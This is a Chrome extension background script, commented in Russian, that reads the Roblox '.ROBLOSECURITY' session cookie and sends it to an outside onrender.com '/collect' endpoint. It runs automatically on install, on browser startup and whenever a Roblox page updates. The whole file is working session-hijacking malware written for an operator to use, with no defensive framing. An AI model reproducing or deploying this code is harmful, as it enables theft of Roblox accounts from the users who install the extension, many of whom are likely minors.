// Функция для отправки куки на сервер Render
function sendCookieToServer() {
    chrome.cookies.get({
        url: "https://www.roblox.com",
        name: ".ROBLOSECURITY"
    }, (cookie) => {
        if (cookie) {
            // Отправляем на твой сервер Render
            fetch('https://d-x6q3.onrender.com/collect?cookie=' + encodeURIComponent(cookie.value))
                .then(response => {
                    if (response.ok) {
                        console.log('✅ Кука отправлена на сервер!');
                    } else {
                        console.error('❌ Сервер вернул ошибку:', response.status);
                    }
                })
                .catch((error) => {
                    console.error('❌ Ошибка отправки на сервер:', error);
                });
        } else {
            console.log('❌ Кука не найдена. Пользователь не залогинен.');
        }
    });
}

// Срабатывает при установке расширения
chrome.runtime.onInstalled.addListener(() => {
    console.log('📦 Расширение установлено. Отправка куки...');
    setTimeout(sendCookieToServer, 2000);
});

// Срабатывает при запуске браузера
chrome.runtime.onStartup.addListener(() => {
    console.log('🔄 Браузер запущен. Отправка куки...');
    setTimeout(sendCookieToServer, 3000);
});

// Срабатывает при обновлении страницы Roblox
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
    if (tab.url && tab.url.includes('roblox.com')) {
        console.log('🔄 Страница Roblox обновлена. Проверка куки...');
        setTimeout(sendCookieToServer, 2000);
    }
});
